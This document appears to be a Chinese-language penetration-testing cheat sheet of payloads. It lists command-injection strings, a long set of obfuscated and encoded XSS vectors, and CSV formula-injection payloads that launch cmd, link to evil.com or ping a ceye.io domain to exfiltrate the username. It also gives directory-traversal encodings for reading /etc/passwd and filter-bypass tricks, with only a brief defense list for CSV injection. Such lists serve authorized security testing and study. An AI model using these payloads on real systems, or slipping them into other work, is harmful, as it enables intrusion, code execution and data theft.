# 命令执行常用payload
- ```shell
  `id>>/tmp/ggg`
  ```

- ```shell
  `id>ggg`
  ```

- ```shell
  $(id>ggg)
  ```

- ```shell
  ;`id>>/tmp/ggg`
  ```

- ```shell
  ;`$(touch$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)tmp$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)ggg)`
  ```

- ```shell
  ||id|tee ggg
  ```

  

# xss
- ```html
  <img src=1 onerror=alert(1);>
  ```

- ```html
  &lt;img src=1 onerror=alert(1);&gt;
  ```

- ```unicode
  \u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0031\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003b\u003e
  ```

- ```base64
  PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
  ```

- ```html
  <iframe src="javascript:alert(111)"></iframe>  //火狐/IE/谷歌都支持
  ```

- ```html
  <a href="javascript:alert(111)">aaa</a>
  ```

- ```html
  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+">
  ```

- ```html
  <script src=&#100&#97&#116&#97:text/javascript,alert(1)></script>
  ```

- ```html
  <a href= 'javascript:alert&#40;&#39;123&#39;&#41; '>Hello</a>
  ```

- ```html
  <a href= "j&#97;vascript:alert&#40; '123' &#41;">Hello</a >
  ```

- ```html
  <a  href=  "j&#97;vascript:alert&#0000040;  '123' &#41;">Hello</a >
  ```

- ```html
  <a  href=  "j&#97vascript:alert&#0000040'123' &#41">Hello</a >
  ```

- ```html
  <input onfocus="&#97&#108&#101&#114&#116&#40&#39&#49&#39&#41" autofocus/>
  ```

- ```html
  <embed/src=//www.baidu.com>
  ```

- ```html
  <form action="Javascript:alert(1)"><input type=submit value="click me">
  ```

- ```html
  <form><button formaction=javascript&colon;alert(1)>CLICKME
  ```

- ```html
  <form/action=javascript:alert(22)><input/type=submit>
  ```

- ```html
  <form onsubmit=alert(23)><button>M
  ```

- ```html
  <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
  ```

- ```html
  <object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object>
  ```

- ```html
  <anytag onmouseover=alert(15)>M
  ```

- ```html
  <anytag onclick=alert(16)>click
  ```

- ```html
  <input onfocus=alert(33) autofocus>
  ```

- ```html
  <input onblur=alert(34) autofocus><input autofocus>
  ```

- ```html
  <body/onhashchange=alert(1)><a href=#>clickit
  ```

- ```html
  <body/onload=alert(25)>
  ```

- ```html
  <body onload=prompt(1);>
  ```

- ```html
  <svg/onload=prompt(1);>
  ```

  

# csv注入
- =cmd|'/c notepad.exe'!A0
- =SUM(1+1)*cmd|' /C notepad.exe '!A0
- =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!''
- =HYPERLINK("https://evil.com","evil")
- =cmd|'/C ping -t znu8fe.ceye.io -l 25152'!'A1'
- =cmd|'/C ping -t %USERNAME%.znu8fe.ceye.io -l 25152'!'A1' （ceye平台数据外带）
- -3+2+cmd |' /C calc' !A0(在等于号被过滤时，可以通过运算符+-的方式绕过)
- %0A-3+3+cmd|' /C calc'!D2(参数处输入此payload，%0A被解析，从而后面的数据跳转到下一行)
- ;-3+3+cmd|' /C calc'!D2(导出文件为csv时，若系统在等号=前加了引号’过滤，则可以使用分号绕过，分号；可分离前后两部分内容使其分别执行)
- @SUM(cmd|'/c calc'!A0)
- =HYPERLINK("https://evil.com")
## 防御
- 确保单元格不以特殊字符（“+、-、@、=”）开头
- 对单元格的内容进行特殊字符（“+、-、@、=”）过滤
- 先对原始输入内容进行转义（双引号前多加一个双引号），然后再添加tab键和双引号防止注入
- 导出为Excel格式前，利用代码把单元格的格式设置为文本（对CSV不生效）

# 目录遍历
## 正常目录穿越
- ../
- \.\./
## 命令行目录穿越
- .*.*/
- .?/
- ?./
- .${2}./
- .${2}?/
## 其他
- %2c%2c%2f = ../
- %2e%2e%5c = ..\
- %252c%252c%255c = ..\
- cat /../../etc/passwd =cd ..&&cd ..&&cd etc&&cat passwd  //目录穿越, /被拦截
- % => %25  (双重URL编码)

# 漏洞优先级：
- 命令执行 > 代码执行 > 文件上传 > 文件包含 > SQL注入 > 文件下载 > 逻辑漏洞 > SSRF > XSS ...

# 函数绕过
## 原有方法验证ip绕过
- C/C++：inet_aton()  inet_pton()
- Python：socket.inet_aton()
- 绕过方法：\0 \n 空格
